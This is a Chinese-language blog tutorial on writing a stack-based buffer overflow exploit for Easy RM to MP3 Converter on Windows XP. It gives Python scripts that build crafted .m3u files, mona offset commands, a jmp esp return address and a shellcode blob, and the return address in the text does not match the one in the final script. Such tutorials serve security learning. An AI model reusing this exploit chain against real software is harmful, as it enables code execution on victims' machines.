title: exploit编写教程1：基于栈的溢出
date: 2015-12-15 21:21:14
tags: 
- 缓冲区溢出
- exploit 编写
categories: exploit 编写
---
一直都想系统学习exploit编写，最近找到个不错的网站[Corelan Team](https://www.corelan.be/),准备按照上面的教程学习，这是第一篇古老的buffer overflow
<!-- more -->

# Ⅰ、试验环境
- 测试平台： Microsoft Windows XP SP3
- 漏洞软件：Easy RM to MP3 Converter（版本2.7.3.700）
- 分析工具：Immunity Debugger
- 漏洞描述：通过创建一个恶意的.m3u文件将触发Easy RM to MP3 Converter (version 2.7.3.700)缓冲区溢出利用。

# Ⅱ、漏洞触发
我选用Python语言编写脚本，首先构造一个30000个字符的.m3u文件，前面25000全为’A’，后5000个为’B’。
```
#!/usr/bin/python
filename = "test.m3u"
f = open(filename,'w')
data = 'A' * 25000 + 'B' * 5000
f.write(data)
f.close()
```
使用Easy RM to MP3 Converter加载这个crash.m3u文件，出错，信息如下：

![](http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0oss5wf7j30e5050759.jpg)

从上图可知，溢出之后的返回地址是0x42424242，也就是’BBBB’，这说明要覆盖的EIP在25000到30000之间。下面使用Immunity的查件mona来进行精确定位。

# Ⅲ、EIP定位
使用Immunity Debugger -> open -> RM2MP3Converter.exe ，F9运行，然后点击load -> test.m3u
回到Immunity Debugger，创建包含5000个字符的pattern
在命令行输入：
```
!mona pattern_create 5000
```

![](http://ww4.sinaimg.cn/large/005CA6ZCgw1ez0oyoodoej30i00dd0wn.jpg)

从Log data中可知，pattern文件在C:\D\mona-master\output\RM2MP3Converter\pattern.txt，
提取出生成的5000个字符文件，放入p.txt，并替换crash.m3u中最后5000个字符。脚本如下：
```
#!/usr/bin/python
filename = "test_pattern.m3u"
f = open(filename,'w')
data = 'A' * 25000
	
fp = open("p.txt",'r')
data += fp.read()
f.write(data)
f.close()
```

再次打开目标软件加载test_pattern.m3u，程序崩溃：

![](http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p2ebjfwj30e6040q3n.jpg)

此时EIP为：386b4237
在命令行输入：
```
!mona pattern_offset 386b4237
```

![](http://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p476wlpj30mm0cp0wk.jpg)

我们看到EIP被修改的位置是25000 + 1103。
此时我们再用如下脚本测试一下位置是否正确：
```
#!/usr/bin/python
filename = "test.m3u"
f = open(filename,'w')
data = 'A' * 26103 + 'B' * 4 + 'C'*100
f.write(data)
f.close()
```

![](http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0p83itkrj30e503ymxw.jpg)

我们可以看到，EIP现在是4个B，偏移正确，下面就是如何修改 EIP

# Ⅳ、寻找shellcode存放的地址空间
再次使用上面.m3u文件，崩溃时，打开栈的窗口

![](http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pbcdfiqj30ap0cfdhq.jpg)

我们看到在ESP此时为000FF730，EIP到这里还有4个字节。ESP开始用于存放shellcode。

# V、查找jmp esp地址
再次加载目标程序，F9之后Pause，在CPU窗口，右键 Search For ->All commands in All modules，在之后的窗口输入jmp esp。

![](http://ww2.sinaimg.cn/large/005CA6ZCgw1ez0pcw5iv0j30mx03uabs.jpg)

选一个7C874413（地址随便选，没有影响）。

# Ⅵ、构造最终的输入文件
```
#!/usr/bin/python
shellcode = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
"\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
"\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
"\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
"\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
"\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
"\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
"\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
"\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
"\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
"\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
"\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
"\x40\xFF\x54\x24\x40\x57\xFF\xD0");
	
ret = "\x7B\x46\x86\x7C";
filename = "crash.m3u"
f = open(filename,'w')
data = 'A' * 26103 + ret + '\x90' * 4 + shellcode
f.write(data)
f.close()
```
使用Easy RM to MP3 Converter加载这个crash.m3u文件，OK，成功了！！！

![](http://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pdv48mlj30bo04cwez.jpg)

# Ⅶ、参考文献
<https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/>
[exploit编写笔记1——基于栈的溢出](http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/03/16/exploit-buffer-overflow/)



